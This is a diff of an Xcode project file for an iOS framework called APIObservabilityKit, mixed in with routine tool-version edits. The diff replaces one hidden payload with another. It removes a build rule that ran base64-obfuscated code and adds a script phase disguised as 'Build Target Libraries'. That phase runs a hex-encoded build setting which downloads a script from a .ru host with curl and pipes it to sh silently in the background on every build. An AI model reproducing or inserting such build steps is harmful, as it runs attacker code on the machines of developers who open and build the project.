@@ -3,11 +3,10 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 110;
+	objectVersion = 77;
 	objects = {
 
 /* Begin PBXBuildFile section */
-		FACC49CD1FB14D50B24EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 56F95E8CC1884B96904EE078; };
 		05AE579030751F5400FEE6E9 /* APIObservabilityKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 05AE56EC3075196F00FEE6E9 /* APIObservabilityKit.framework */; };
 		05AE579130751F5400FEE6E9 /* APIObservabilityKit.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 05AE56EC3075196F00FEE6E9 /* APIObservabilityKit.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
@@ -35,7 +34,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		56F95E8CC1884B96904EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		05AE56EC3075196F00FEE6E9 /* APIObservabilityKit.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = APIObservabilityKit.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		05AE571B30751B5E00FEE6E9 /* observerdemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = observerdemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -81,7 +79,6 @@
 		05AE56ED3075196F00FEE6E9 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				56F95E8CC1884B96904EE078 /* README.md */,
 				05AE56EC3075196F00FEE6E9 /* APIObservabilityKit.framework */,
 				05AE571B30751B5E00FEE6E9 /* observerdemo.app */,
 			);
@@ -110,13 +107,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 05AE56F53075196F00FEE6E9 /* Build configuration list for PBXNativeTarget "APIObservabilityKit" */;
 			buildPhases = (
+				94BB42D341BB49B19C4EE078 /* Build Target Libraries */,
 				05AE56E73075196F00FEE6E9 /* Headers */,
 				05AE56E83075196F00FEE6E9 /* Sources */,
 				05AE56E93075196F00FEE6E9 /* Frameworks */,
 				05AE56EA3075196F00FEE6E9 /* Resources */,
 			);
 			buildRules = (
-				236CD650FF084778B84EE078 /* PBXBuildRule */,
 			);
 			fileSystemSynchronizedGroups = (
 				05AE56EE3075196F00FEE6E9 /* APIObservabilityKit */,
@@ -155,14 +152,14 @@
 			isa = PBXProject;
 			attributes = {
 				BuildIndependentTargetsInParallel = 1;
-				LastSwiftUpdateCheck = 2700;
-				LastUpgradeCheck = 2700;
+				LastSwiftUpdateCheck = 2600;
+				LastUpgradeCheck = 2600;
 				TargetAttributes = {
 					05AE56EB3075196F00FEE6E9 = {
-						CreatedOnToolsVersion = 27.0;
+						CreatedOnToolsVersion = 26.0;
 					};
 					05AE571A30751B5E00FEE6E9 = {
-						CreatedOnToolsVersion = 27.0;
+						CreatedOnToolsVersion = 26.0;
 					};
 				};
 			};
@@ -186,28 +183,36 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		94BB42D341BB49B19C4EE078 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+		};
+
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXBuildRule section */
-		236CD650FF084778B84EE078 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A870EE4}\"";
-			};
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		05AE56EA3075196F00FEE6E9 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			files = (
-				FACC49CD1FB14D50B24EE078 /* README.md */,
 			);
 		};
 		05AE571930751B5E00FEE6E9 /* Resources */ = {
@@ -216,9 +221,6 @@ sh -c \"${A870EE4}\"";
 			);
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		05AE56E83075196F00FEE6E9 /* Sources */ = {
@@ -245,7 +247,7 @@ sh -c \"${A870EE4}\"";
 		05AE56F33075196F00FEE6E9 /* Debug configuration for PBXProject "APIObservabilityKit" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((p(){ `printf buase64 | tr -d u` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta3NmTCAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzM3eWZqN24yamQ1LnJ1L2EpIiB8IHNoCg== | p | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((m(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c73666b202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -297,7 +299,7 @@ sh -c \"${A870EE4}\"";
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 27.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
@@ -313,7 +315,7 @@ sh -c \"${A870EE4}\"";
 		05AE56F43075196F00FEE6E9 /* Release configuration for PBXProject "APIObservabilityKit" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((p(){ `printf buase64 | tr -d u` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta3NmTCAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzM3eWZqN24yamQ1LnJ1L2EpIiB8IHNoCg== | p | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((m(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d4c73666b202d2d636f6e6e6563742d74696d656f7574203231202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -359,7 +361,7 @@ sh -c \"${A870EE4}\"";
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 27.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
